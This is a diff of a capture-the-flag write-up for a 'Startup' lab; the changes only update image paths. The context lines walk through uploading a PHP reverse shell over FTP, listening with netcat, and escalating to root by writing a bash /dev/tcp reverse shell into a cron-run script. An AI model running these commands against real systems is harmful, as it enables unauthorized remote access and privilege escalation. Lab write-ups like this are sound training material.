@@ -72,7 +72,7 @@ Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. Peo
 - lets look at the web-server now
 ## further Enumeration: 
 ---
-![](assets/Startup_1.png)
+![](Startup/images/Startup_1.png)
 - this is the first thing we see when we open up the site 
 - there was nothing special in the `source-code`, so lets use `Gobuster` to find other files or directory's on this web-server
 ### Gobuster: 
@@ -90,7 +90,7 @@ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u http://1
 /server-status        (Status: 403) [Size: 278]
 ```
 - there is a `/files` directory, lets look into that: 
-![](assets/Startup_2.png)
+![](Startup/images/Startup_2.png)
 - So these are the same files we saw when we logged into the `FTP` server
 - we could try to upload a `reverse-shell` into that directory with `FTP` 
 ## revers-shell: 
@@ -122,7 +122,7 @@ put php-reverse-shell.php
 ```
 - it works 
 - lets go back to the web-server and see if can run the `reverse-shell`: 
-![](assets/Startup_3.png)
+![](Startup/images/Startup_3.png)
 - so we see the `reverse-shell`, that's a good sign 
 - lets setup a listener with `netcat` on our attacker-machine: 
 ```bash
@@ -131,7 +131,7 @@ nc -lnvp 1234
 - **NOTE:** the Port has to match the Port you set in the `reverse-shell` 
 - lets click on the `reverse-shell` on the website and hope we get a shell 
 
-![](assets/Startup_4.png)
+![](Startup/images/Startup_4.png)
 - it worked and now we got a `shell` 
 
 ## Privilege Escalation: 
@@ -208,13 +208,13 @@ wget http://10.64.186.249:8000/suspicious.pcapng
 wireshark suspicious.pcapng
 ```
 
-![](assets/Startup_5.png)
+![](Startup/images/Startup_5.png)
 - we see a lot of `TCP` packets and a little bit of `HTTP` packets 
 - in the picture you can see the `34.` packet is a `HTTP` packet that requested a `shell.php` from we same path on the web-server, as we did to get a `reverse-shell` going
 - so maybe someone else did the same thing as we did 
 - lets check the `TCP`-stream (in Wireshark: Analyze -> Follow -> TCP Stream)
 - when we got to Stream `7` we can see this: 
-![](assets/Startup_6.png)
+![](Startup/images/Startup_6.png)
 - so someone did also start a `reverse-shell` and executed commands 
 - we can see that this person tried to run `suod -l`, but had a wrong password 
 - we could try to use this password to log into `lennie` 
@@ -261,7 +261,7 @@ echo $LIST > /home/lennie/scripts/startup_list.txt
 - lets get this script on the machine, the same way we did with the `.pcapng`, just the other way around 
 
 - lets run the script and see if we see a process that runs the `planner.sh` 
-![](assets/Startup_7.png)
+![](Startup/images/Startup_7.png)
 - here we can see that `planner.sh` gets executed every minute 
 - we now could place a reverse-shell in `print.sh` and setup a listener on our machine and wait for a connection:
 ```bash
@@ -273,7 +273,7 @@ echo "/bin/bash -i >& /dev/tcp/192.168.154.152/1235 0>&1" > print.sh
 ```
 - lets wait
 
-![](assets/Startup_8.png)
+![](Startup/images/Startup_8.png)
 - we got a `root-shell`, we can now read `root.txt`: 
 ```bash
 THM{<Redacted>}  
